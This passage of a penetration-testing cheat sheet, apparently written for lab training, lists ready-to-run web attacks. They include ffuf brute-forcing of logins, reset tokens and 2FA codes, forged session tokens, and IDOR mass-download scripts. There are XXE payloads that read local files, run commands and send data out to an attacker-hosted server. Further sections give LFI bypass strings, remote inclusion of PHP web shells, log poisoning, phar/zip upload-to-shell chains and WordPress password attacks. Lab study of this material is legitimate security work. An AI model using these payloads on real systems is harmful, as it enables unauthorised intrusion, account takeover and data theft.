$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://<IP address>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

- Filtering Wordlist

```
$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '^.{12}$' | grep -Ev '[^[:alnum:]]' > custom_wordlist.txt
```

- Password Brute-Force

```
$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

- Password Reset Token Brute-Force

```
$ seq -w 0 9999 > tokens.txt
$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

- 2FA Code Brute-Force

```
$ seq -w 0 9999 > tokens.txt
$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

- Default Credentials

```
https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/tree/master
```

- Security Questions Brute-Force

```
https://github.com/datasets/world-cities/blob/master/data/world-cities.csv
$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```

- Intercept Web Response

```
In Burp -> Right-Click request ->  Do intercept -> Response to this request -> Change status code to 200 instead of 302
```

- Parameter Brute-Force

```
$ seq -w 0 999 > parameters.txt
$ ffuf -w ./parameters.txt -u http://<IP address>/admin.php?user_id=FUZZ -fr "Could not load admin data"
```

- Session Token Brute-Force

```
$ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
user=htb-stdnt;role=user

$ echo -n 'user=htb-stdnt;role=admin' | base64
dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==

$ echo 757365723d6874622d7374646e743b726f6c653d75736572 | xxd -r -p
user=htb-stdnt;role=user

$ echo -n 'user=htb-stdnt;role=admin' | xxd -p
757365723d6874622d7374646e743b726f6c653d61646d696e
```

#19. - HTTP Verb Tampering
-----------------------------------------

- Check Accepted HTTP Methods

```
$ curl -i -X OPTIONS http://<IP address>:<port>/
```

- Burp Request HTTP Method Tampering

```
Right-click intercepted request in Burp -> Change Request Method
Rename the GET/POST request to a HEAD
```

#20. - Insecure Direct Object References (IDOR)
-----------------------------------------

- IDOR Parameters

```
http://<IP address>/documents.php?uid=1
http://<IP address>/documents.php?uid=2
http://<IP address>/documents.php?uid=3
```

- Mass Enumeration IDOR Parameter

```
#!/bin/bash

url="http://<IP address>:<port>"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

- Mass Enumeration IDOR Parameter POST Request

```
#!/bin/bash

url="http://<IP address>:<port>"

for i in {1..20}; do
        for link in $(curl -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\.\w+"); do
                wget -q $url/$link
        done
done
```

- Mass Enumeration Encoded IDOR Parameter

```
#!/bin/bash

for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | jq -sRr @uri | tr -d ' -'); do
        curl -sOJ  http://<IP address>:<port>/download.php?contract=$hash
    done
done
```

- Mass Enumeration Encoded IDOR Parameter POST Request

```
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<IP address>:<port>/download.php
    done
done
```

#21. - XML External Entity (XXE) Injection
-----------------------------------------

- Print Text

```
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company "Big Old Test String">
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &company;
      </email>
      <message>
         Test
      </message>
   </root>
```

- Local File Inclusion (LFI)

```
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &company;
      </email>
      <message>
         Test
      </message>
   </root>
```

- PHP Wrapper Filter

```
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &company;
      </email>
      <message>
         Test
      </message>
   </root>
```

- Code Execution

```
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company SYSTEM "expect://whoami">
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &company;
      </email>
      <message>
         Test
      </message>
   </root>
```

- Web Shell

```
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80

<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<IP address>/shell.php'">
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &company;
      </email>
      <message>
         Test
      </message>
   </root>
```

- Denial of Service (DoS)

```
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY a0 "DOS" >
   <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
   <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
   <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
   <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
   <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
   <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
   <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
   <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
   <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
   <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &company;
      </email>
      <message>
         Test
      </message>
   </root>
```

- Advanced Exfiltration with CDATA

```
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000

<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
   <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
   <!ENTITY % xxe SYSTEM "http://<IP address>:8000/xxe.dtd"> <!-- reference our external DTD -->
   %xxe;
   ]>
   <root>
      <name>
         First
      </name>
      <tel>
      </tel>
      <email>
         &joined;
      </email>
      <message>
         Test
      </message>
   </root>
```

- Advanced Error-Based Exfiltration

```
$ echo '<!ENTITY % file SYSTEM "file:///etc/hosts">' > xxe.dtd
$ cat << 'EOF' >> xxe.dtd
> <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
> EOF
$ python3 -m http.server 8000

<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://<IP address>:8000/xxe.dtd">
   %remote;
   %error;
   ]>
   <root>
      <name>
      </name>
      <tel>
      </tel>
      <email>
         &nonExistingEntity;
      </email>
      <message>
      </message>
   </root>
```

- Blind Out-Of-Band Data Exfiltration

```
$ echo '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">' > xxe.dtd
$ cat << 'EOF' >> xxe.dtd
> <!ENTITY % oob "<!ENTITY content SYSTEM 'http://<IP address>:8000/?content=%file;'>">
> EOF

# Save to index.php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

$ php -S 0.0.0.0:8000

<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://<IP address>:8000/xxe.dtd">
   %remote;
   %oob;
   ]>
   <root>
      &content;
   </root>
```

- Automated Out-Of-Band Data Exfiltration

```
$ git clone https://github.com/enjoiz/XXEinjector.git

# Save this to xxe.req
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

$ ruby XXEinjector.rb --host=<IP address> --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

$ cat Logs/10.129.201.94/etc/passwd.log
```

#22. - File Inclusion
-----------------------------------------

- LFI

```
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?language=/../../../etc/passwd	
```

- LFI Bypasses

```
/index.php?language=....//....//....//....//etc/passwd
/index.php?language=..././..././..././..././etc/passwd
/index.php?language=....\/....\/....\/....\/etc/passwd
/index.php?language=....////....////....////....////etc/passwd
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
/index.php?language=./languages/../../../../etc/passwd
/index.php?language=languages//....//....//....//....//etc/passwd
$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
/index.php?language=../../../../etc/passwd%00
```

- PHP Wrappers

```
/index.php?language=php://filter/read=convert.base64-encode/resource=config
/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini
$ echo '<base64 string>' | base64 -d | grep allow_url_include        # needed for input wrapper, and any RFI attack
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
$ echo '<base64 string>' | base64 -d | grep expect        # needed for expect wrapper
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

- RFI

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>	Host web shell
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && sudo python -m pyftpdlib -p 21	Host web shell
/index.php?language=ftp://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && impacket-smbserver -smb2support share $(pwd)	Host web shell
/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

- LFI + Upload

```
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
/index.php?language=./profile_images/shell.gif&cmd=id
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php	
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

# Write this to a shell.php file
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

- Log Poisoning

```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
/index.php?language=/var/log/apache2/access.log&cmd=id
```

- Fuzzing

```
$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287	Fuzz LFI payloads
$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287	Fuzz webroot path
$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

- Wordlists

```
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
```

- Automated File Inclusion

```
https://github.com/D35m0nd142/LFISuite
https://github.com/OsandaMalith/LFiFreak
https://github.com/mzfr/liffy
```

#23. - Session Hijacking
-----------------------------------------

- Steal Cookie

```
Open Dev Tools -> Storage -> Copy Cookie Value from Authenticated Session -> Paste Cookie Value into Unauthenticated Session
```

#24. - WordPress
-----------------------------------------

- Version Enumeration

```
$ curl -s -X GET <URL> | grep '<meta name="generator"'
$ cat /var/www/html/wordpress/readme.html
```

- Plugin Enumeration

```
$ curl -s -X GET <URL> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
$ curl -s -X GET http://<URL>/wp-content/plugins/<plugin name>/ | html2text
$ curl -I -X GET http://<URL>/wp-content/plugins/<plugin name>
$ wpscan --url <URL> -e ap
$ wpscan --url <URL> -e ap --api-token <API token>
```

- Theme Enumeration

```
$ curl -s -X GET <URL> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
$ curl -I -X GET http://<URL>/wp-content/themes/<theme name>
$ wpscan --url <URL> -e at
$ wpscan --url <URL> -e at --api-token <API token>
```

- User Enumeration

```
$ curl -s -I http://<URL>/?author=1
$ curl http://<URL>/wp-json/wp/v2/users | jq
$ wpscan --url <URL> -e u	
```

- Brute-Force

```
$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<URL>/xmlrpc.php
$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url <URL>
```

#25. - Sensitive Data Exposure
-----------------------------------------

- Source Code

```
Right-click -> View page source
OR
CTRL + U
```

#26. - HTML Injection
-----------------------------------------

- Hyperlink

```
<a href="http://www.google.com">Click Me</a>
```


#27. - Cross-Site Request Forgery (CSRF)
-----------------------------------------

- Password Change

```
"><script src=//www.example.com/exploit.js></script>
```

#28. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```
